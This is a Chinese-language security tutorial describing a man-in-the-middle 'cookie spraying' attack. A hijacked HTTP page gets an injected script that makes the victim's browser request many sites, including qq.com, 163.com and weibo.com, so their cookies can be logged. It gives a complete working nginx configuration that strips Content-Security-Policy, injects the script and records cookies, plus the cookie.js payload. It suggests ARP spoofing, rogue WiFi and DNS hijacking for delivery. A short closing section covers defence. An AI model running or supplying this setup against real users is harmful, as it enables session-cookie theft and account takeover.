# 中间人攻击 -- Cookie喷发

0x00 前言
=======

* * *

分享个中间人攻击姿势，屡试不爽。

原本[是篇老文](http://www.cnblogs.com/index-html/p/mitm-cookie-sniffer.html)，不过写的太啰嗦。今天用简明的文字，重新讲一遍。

0x01 原理
=======

* * *

传统 cookie 嗅探，只能获得用户主动访问的站点。不访问就抓不到，效率很低。

如果流量可控，不如在用户访问的页面中注入一个脚本。通过脚本，就可以请求任意站点：

```
new Image().src = 'http://anyhost'

```

因为请求头部会带上 cookie，所以能把任意站点的 cookie 骗上流量，让中间人拿到。

0x02 爆发
=======

* * *

首先收集各大网站域名，然后挨个来一发：

```
var list = ['qq.com', '163.com', 'weibo.com', ...];

for (var i of list) {
    new Image().src = 'http://' + i + '/__cookie';
}

```

这样，就能把用户各种网站的 cookie 都爆上一遍。

后端收到`/__cookie`请求，记录其中的 cookie，然后返回一个空内容。于是只需极小的流量，就可以测试一个站点。

0x03 优化
=======

* * *

因为收集了各种站点，所以需要大量的域名解析。

为了让爆破更快，可以再劫持用户的 DNS 请求，暂时解析成自己 IP，这样域名查询就不用走外网。

```
       DNS
     <----->
用户          中间人       外网
     <----->
       HTTP

```

同时还有个巨大的好处：整个系统不依赖外网，可以离线劫持！

比如在没互联网的地方，开一个 WiFi 就能攻击。

0x04 演示
=======

* * *

我们用 nginx 来演示：

```
# nginx.conf

http {
    resolver            114.114.114.114;
    ...

    log_format          record_cookie '$time_iso8601 $remote_addr $http_host $http_cookie';

    # 静态资源
    server {
        listen          8080;
        server_name     m.io;
        gzip            on;
        #expires         1d;
        root            /path/to/;
    }

    # 代理服务
    server {
        listen          8080 default_server;
        server_name     _;
        gzip            on;

        location / {
            # 请求的是 html 资源，进入劫持流程
            if ($http_accept ~ "text/html") {
                rewrite             ^   /__html;
            }
            # 其他资源，正常代理
            proxy_pass              http://$http_host;
        }

        # 页面注入
        location = /__html {
            internal;

            # 压缩的内容无法 sub_filter，先解压
            proxy_set_header        host    $http_host;
            proxy_pass              http://127.0.0.1:50000$request_uri;

            # 删除 CSP 头，防止被阻挡
            proxy_hide_header       Content-Security-Policy;

            # 注入脚本
            sub_filter              <head   "<script src=//m.io/cookie.js></script><head";
        }

        # 记录 cookie
        location = /__cookie {
            access_log              /path/to/cookies.log  record_cookie;

            # 设置缓存时间
            # 避免每次访问页面，都产生大量请求（其实在 js 里判断会更好）
            add_header              Cache-Control   "max-age=3600";

            # 返回空内容
            return                  200;
        }
    }

    # 解压服务
    server {
        listen          127.0.0.1:50000;
        gunzip          on;

        location / {
            proxy_set_header        Accept-Encoding     deflate;
            proxy_pass              http://$host;
        }
    }
}

```

在`/path/to`目录下，放置前端攻击脚本：

```
// cookie.js

(function(list) {
    if (self != top) return;

    list = list.split(' ');

    for (var i = 0; i < list.length; i++) {
        new Image().src = 'http://' + list[i] + '/__cookie';
    }
})(
    // 目标站点列表
    '163.com qq.com weibo.com'
)

```

把浏览器的 HTTP 代理设成 127.0.0.1:8080，就可以演示了。

打开任意 HTTP 页面，就可以爆出用户的各种 Cookie：

![p1](http://drops.javaweb.org/uploads/images/bca8ab4e07c4b6615f63cbd4b6292700bfb9faae.jpg)

![p2](http://drops.javaweb.org/uploads/images/c0196918f724c607c7a87b40c4872535af81506c.jpg)

实战方式有很多，能控制流量就行。比如 ARP 攻击、钓鱼 WiFi、钓鱼代理，或者[劫持小区 PPPoE 网络](http://fex.baidu.com/blog/2014/04/traffic-hijack/)，等等。

0x05 防范
=======

* * *

其实和 JSONP 隐私泄露类似，关闭浏览器「第三方 cookie」即可。

三方 cookie 百害而无一利，隐私泄露的罪魁祸首。